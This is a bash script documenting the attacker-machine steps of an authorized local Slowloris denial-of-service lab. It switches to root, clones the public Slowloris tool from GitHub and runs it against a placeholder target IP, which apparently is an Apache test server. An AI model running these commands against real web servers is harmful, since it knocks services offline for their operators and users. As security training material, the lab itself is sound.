#!/bin/bash
# ==========================================================
# DoS / Slowloris Lab — Attacker Machine Documentation
# ==========================================================
# Purpose:
# Document the commands used on the attacker machine
# during an authorized local VirtualBox security lab.
#
# Attacker Machine: Kali Linux
# Target Machine:   Local lab VM
# Tool:             Slowloris
# ==========================================================

# 1. Switch to root user
sudo su

# 2. Create a directory for the DoS lab
mkdir dos

# 3. Enter the newly created directory
cd dos

# 4. Clone the Slowloris repository
git clone https://github.com/gkbrk/slowloris.git

# 5. Check the cloned repository
ls

# 6. Enter the Slowloris directory
cd slowloris

# 7. View the available files
ls

# 8. Run Slowloris against the authorized lab target
python3 slowloris.py <TARGET_MACHINE_IP>

# In the lab, the script was then run against the local Apache test server shown in the screenshots.
# (Target-specific attack parameters omitted.)
# Target: Authorized local lab machine
